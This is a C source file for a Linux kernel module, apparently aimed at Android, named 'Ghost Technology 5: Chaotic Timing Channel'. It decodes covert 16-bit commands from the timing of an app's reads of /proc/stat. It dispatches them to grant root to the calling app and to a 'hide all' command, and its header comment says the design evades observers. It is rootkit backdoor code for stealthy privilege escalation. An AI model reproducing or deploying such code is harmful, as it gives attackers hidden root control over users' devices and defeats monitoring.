// SPDX-License-Identifier: GPL-2.0-only
/*
 * Ghost Technology 5: Chaotic Timing Channel
 *
 * Instead of ioctl/fd communication, encode commands in the timing
 * of normal operations (reading /proc/stat). The kernel monitors
 * read timing intervals and decodes commands from them.
 * Looks like normal system monitoring to any observer.
 */
#include "ghost.h"
#include "klog.h"
#include <linux/ktime.h>
#include <linux/sched.h>
#include <linux/version.h>

#define CTC_BIT_INTERVAL_SHORT 100000  /* 100μs = bit 0 */
#define CTC_BIT_INTERVAL_LONG  200000  /* 200μs = bit 1 */
#define CTC_BITS_PER_COMMAND   16
#define CTC_TIMEOUT_NS         5000000 /* 5ms timeout */

struct ctc_channel {
    ktime_t last_read;
    u32 buffer;
    int bits_collected;
    u32 last_command;
    pid_t tracked_pid;
};

static struct ctc_channel ctc_chan;
static DEFINE_MUTEX(ctc_lock);

/* Called when a process reads /proc/stat */
void ghost_ctc_handle_read_stat(uid_t uid)
{
    uid_t appid = uid % 100000;
    if (appid < 10000)
        return;

    if (atomic_read(&ghost_emergency_stop))
        return;

    ktime_t now = ktime_get();
    ktime_t diff = ktime_sub(now, ctc_chan.last_read);
    s64 diff_ns = ktime_to_ns(diff);

    mutex_lock(&ctc_lock);

    /* Check for timeout (new command start) */
    if (diff_ns > CTC_TIMEOUT_NS)
        ctc_chan.bits_collected = 0;

    if (ctc_chan.bits_collected < CTC_BITS_PER_COMMAND) {
        /* Decode bit from timing interval */
        if (diff_ns > CTC_BIT_INTERVAL_SHORT / 2) {
            bool bit = (diff_ns > (CTC_BIT_INTERVAL_SHORT + CTC_BIT_INTERVAL_LONG) / 2);
            ctc_chan.buffer = (ctc_chan.buffer << 1) | (bit ? 1 : 0);
            ctc_chan.bits_collected++;
        }
    }

    /* Command complete */
    if (ctc_chan.bits_collected >= CTC_BITS_PER_COMMAND) {
        ctc_chan.last_command = ctc_chan.buffer;
        ctc_chan.bits_collected = 0;

        /* Dispatch command */
        switch (ctc_chan.last_command) {
        case 0x0001: /* Grant root */
            ghost_tde_request(uid);
            break;
        case 0x0002: /* Hide all */
            break;
        case 0xFFFF: /* Emergency stop */
            atomic_set(&ghost_emergency_stop, 1);
            break;
        default:
            break;
        }
    }

    ctc_chan.last_read = now;
    mutex_unlock(&ctc_lock);
}

void ghost_ctc_init(void)
{
    memset(&ctc_chan, 0, sizeof(ctc_chan));
    ctc_chan.last_read = ktime_get();
    pr_info("ghost_ctc: Chaotic Timing Channel initialized\n");
}

void ghost_ctc_exit(void)
{
    memset(&ctc_chan, 0, sizeof(ctc_chan));
    pr_info("ghost_ctc: disabled\n");
}
